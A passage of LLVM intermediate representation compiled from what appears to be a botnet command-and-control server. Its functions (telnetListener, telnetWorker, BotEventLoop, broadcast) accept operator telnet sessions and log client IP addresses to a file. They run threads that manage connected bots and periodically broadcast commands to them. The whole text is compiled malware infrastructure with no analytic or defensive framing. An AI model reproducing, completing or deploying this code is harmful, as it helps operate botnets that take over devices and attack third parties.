  %1328 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1321, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.133, i64 0, i64 0), i8* %1326, i8* %1327)
  %1329 = load %struct._IO_FILE*, %struct._IO_FILE** %65, align 8
  %1330 = call i32 @fclose(%struct._IO_FILE* %1329)
  %1331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %1332 = load i32, i32* %5, align 4
  %1333 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  call void @broadcast(i8* %1331, i32 %1332, i8* %1333)
  %1334 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1334, i8 0, i64 2048, i1 false)
  br label %342, !llvm.loop !26

1335:                                             ; preds = %342
  br label %1336

1336:                                             ; preds = %1335, %1306, %1282, %1259, %1254, %1226, %1218, %1210, %1202, %1194, %1186, %1178, %1170, %1162, %1154, %1138, %1130, %1122, %1114, %1106, %1098, %1090, %1082, %1074, %1066, %1056, %1049, %1041, %1033, %1025, %1017, %1009, %982, %975, %967, %959, %951, %943, %935, %927, %919, %888, %881, %873, %865, %333, %327, %319, %311, %303, %295, %287, %279, %271, %263, %255, %247, %212, %204, %193, %192, %187, %182, %177, %172, %153, %147, %126, %120
  %1337 = load i32, i32* %5, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1338
  %1340 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1339, i32 0, i32 0
  store i32 0, i32* %1340, align 4
  %1341 = load i32, i32* %5, align 4
  %1342 = call i32 @close(i32 %1341)
  %1343 = load volatile i32, i32* @OperatorsConnected, align 4
  %1344 = add nsw i32 %1343, -1
  store volatile i32 %1344, i32* @OperatorsConnected, align 4
  br label %1345

1345:                                             ; preds = %1336, %1253, %844, %829, %814, %799, %784, %769, %754, %739, %724, %709, %694, %679, %664, %649, %634, %619, %604, %589, %574, %566, %558, %550, %525, %517, %509, %501, %476, %468, %460, %452, %427, %419, %411, %403, %395, %387, %379
  %1346 = load i8*, i8** %2, align 8
  ret i8* %1346
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct._IO_FILE*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i64 0, i64 0))
  br label %14

14:                                               ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %2, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 zeroext %20) #10
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %3, align 4
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* %24, i32 16) #9
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %14
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.136, i64 0, i64 0))
  br label %28

28:                                               ; preds = %27, %14
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @listen(i32 %29, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %31

31:                                               ; preds = %28, %68
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.137, i64 0, i64 0))
  %33 = bitcast %struct.sockaddr_in* %7 to { i64, i64 }*
  %34 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 4
  %36 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 1
  %37 = load i64, i64* %36, align 4
  call void @client_addr(i64 %35, i64 %37)
  %38 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %8, align 8
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = and i32 %42, 255
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 65280
  %48 = lshr i32 %47, 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 16711680
  %53 = lshr i32 %52, 16
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, -16777216
  %58 = lshr i32 %57, 24
  %59 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %39, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.138, i64 0, i64 0), i32 %43, i32 %48, i32 %53, i32 %58)
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %61 = call i32 @fclose(%struct._IO_FILE* %60)
  %62 = load i32, i32* %3, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @accept(i32 %62, %struct.sockaddr* %63, i32* %5)
  store i32 %64, i32* %4, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %31
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.139, i64 0, i64 0))
  br label %68

68:                                               ; preds = %67, %31
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %71) #9
  br label %31
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %24

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.140, i64 0, i64 0), i8* %21)
  %23 = call i32 @sleep(i32 5)
  call void @exit(i32 1) #11
  unreachable

24:                                               ; preds = %3
  %25 = load i8**, i8*** %6, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 3
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27) #8
  store i32 %28, i32* %10, align 4
  %29 = call i32 @file_exist(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0))
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %24
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.141, i64 0, i64 0))
  br label %36

33:                                               ; preds = %24
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.142, i64 0, i64 0))
  %35 = call i32 @sleep(i32 5)
  call void @exit(i32 1) #11
  unreachable

36:                                               ; preds = %31
  %37 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.143, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.144, i64 0, i64 0))
  store %struct._IO_FILE* %37, %struct._IO_FILE** @telFD, align 8
  %38 = load i8**, i8*** %6, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40) #8
  store i32 %41, i32* %9, align 4
  %42 = load i8**, i8*** %6, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @create_and_bind(i8* %44)
  store volatile i32 %45, i32* @listenFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %49

48:                                               ; preds = %36
  call void @abort() #11
  unreachable

49:                                               ; preds = %36
  %50 = load volatile i32, i32* @listenFD, align 4
  %51 = call i32 @make_socket_non_blocking(i32 %50)
  store i32 %51, i32* %8, align 4
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

54:                                               ; preds = %49
  call void @abort() #11
  unreachable

55:                                               ; preds = %49
  %56 = load volatile i32, i32* @listenFD, align 4
  %57 = call i32 @listen(i32 %56, i32 4096) #9
  store i32 %57, i32* %8, align 4
  %58 = load i32, i32* %8, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %61

60:                                               ; preds = %55
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.145, i64 0, i64 0))
  call void @abort() #11
  unreachable

61:                                               ; preds = %55
  %62 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %62, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @epollFD, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

65:                                               ; preds = %61
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i64 0, i64 0))
  call void @abort() #11
  unreachable

66:                                               ; preds = %61
  %67 = load volatile i32, i32* @listenFD, align 4
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %69 = bitcast %union.epoll_data* %68 to i32*
  store i32 %67, i32* %69, align 1
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %70, align 1
  %71 = load volatile i32, i32* @epollFD, align 4
  %72 = load volatile i32, i32* @listenFD, align 4
  %73 = call i32 @epoll_ctl(i32 %71, i32 1, i32 %72, %struct.epoll_event* %11) #9
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

76:                                               ; preds = %66
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  call void @abort() #11
  unreachable

77:                                               ; preds = %66
  %78 = load i32, i32* %9, align 4
  %79 = add nsw i32 %78, 2
  %80 = zext i32 %79 to i64
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %12, align 8
  %82 = alloca i64, i64 %80, align 16
  store i64 %80, i64* %13, align 8
  br label %83

83:                                               ; preds = %87, %77
  %84 = load i32, i32* %9, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %9, align 4
  %86 = icmp ne i32 %84, 0
  br i1 %86, label %87, label %93

87:                                               ; preds = %83
  %88 = load i32, i32* %9, align 4
  %89 = add nsw i32 %88, 2
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i64, i64* %82, i64 %90
  %92 = call i32 @pthread_create(i64* %91, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %83, !llvm.loop !27

93:                                               ; preds = %83
  %94 = getelementptr inbounds i64, i64* %82, i64 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = inttoptr i64 %96 to i8*
  %98 = call i32 @pthread_create(i64* %94, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %97) #9
  br label %99

99:                                               ; preds = %100, %93
  br label %100

100:                                              ; preds = %99
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.147, i64 0, i64 0))
  %101 = call i32 @sleep(i32 60)
  br label %99
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.149, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !28

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.151, i64 0, i64 0))
  call void @exit(i32 1) #11
  unreachable

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
